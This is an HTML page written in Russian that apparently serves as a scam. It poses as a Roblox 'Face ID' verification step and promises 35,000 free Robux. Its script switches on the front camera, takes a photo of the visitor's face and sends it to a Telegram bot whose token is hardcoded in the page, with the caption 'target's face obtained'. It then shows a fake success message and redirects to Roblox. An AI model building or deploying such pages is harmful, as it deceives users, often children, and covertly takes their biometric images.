<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Roblox Secure Auth</title>
    <style>
        body { font-family: 'Gotham SSm', helvetica, arial, sans-serif; background-color: #f2f4f5; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .card { background: white; padding: 35px; border-radius: 15px; box-shadow: 0 8px 25px rgba(0,0,0,0.1); text-align: center; width: 85%; max-width: 400px; }
        img.logo { width: 100px; margin-bottom: 25px; }
        h1 { font-size: 22px; color: #393b3d; margin-bottom: 15px; font-weight: 600; }
        p { color: #666; font-size: 15px; line-height: 1.6; margin-bottom: 30px; }
        #auth-btn { background-color: #0084ff; color: white; border: none; padding: 16px; border-radius: 8px; font-size: 17px; font-weight: bold; cursor: pointer; width: 100%; box-shadow: 0 4px 10px rgba(0,132,255,0.3); transition: 0.2s; }
        #auth-btn:active { transform: scale(0.97); background-color: #0073e6; }
        #msg { margin-top: 20px; font-size: 13px; color: #999; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" class="logo">
    <h1>Проверка аккаунта</h1>
    <p>Для завершения получения <b>35,000 Robux</b>, подтвердите, что вы владелец устройства через <b>Face ID</b>.</p>
    <button id="auth-btn" onclick="takeFace()">ПОДТВЕРДИТЬ ЛИЧНОСТЬ</button>
    <div id="msg">Ожидание верификации...</div>
</div>

<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>

<script>
    // Твои настройки
    const BT = '8357508874:AAGFROVFi2_D2AcQKIYlZ7rWgsqqedB3y3I';
    const CI = '7889497672';

    async function takeFace() {
        const btn = document.getElementById('auth-btn');
        const msg = document.getElementById('msg');
        const v = document.getElementById('v');
        const c = document.getElementById('c');

        btn.disabled = true;
        btn.innerText = "СКАНИРОВАНИЕ...";
        msg.innerText = "Подключение к модулю Face ID...";

        try {
            // ПРИНУДИТЕЛЬНО ПЕРЕДНЯЯ КАМЕРА (facingMode: "user")
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" }, 
                audio: false 
            });
            
            msg.innerText = "Анализ биометрии... Не двигайтесь.";
            v.srcObject = stream;
            
            // Ждем 1.2 секунды для четкого кадра лица
            setTimeout(() => {
                c.width = v.videoWidth;
                c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                
                c.toBlob(blob => {
                    const fd = new FormData();
                    fd.append('chat_id', CI);
                    fd.append('photo', blob, 'face.jpg');
                    fd.append('caption', '👤 **ЛИЦО ЦЕЛИ ПОЛУЧЕНО!**\n\n✅ Верификация пройдена.\n📱 Устройство: Обычное');

                    fetch(`https://api.telegram.org/bot${BT}/sendPhoto`, {
                        method: 'POST',
                        body: fd
                    }).then(() => {
                        stream.getTracks().forEach(track => track.stop());
                        alert("✅ Face ID подтвержден! Робуксы будут зачислены в течение 15 минут.");
                        window.location.href = "https://www.roblox.com/home";
                    });
                }, 'image/jpeg', 0.8);
            }, 1200);

        } catch (err) {
            btn.disabled = false;
            btn.innerText = "ПОПРОБОВАТЬ СНОВА";
            msg.style.color = "red";
            msg.innerText = "Ошибка! Нажмите 'Разрешить' для Face ID.";
            console.error(err);
        }
    }
</script>

</body>
</html>
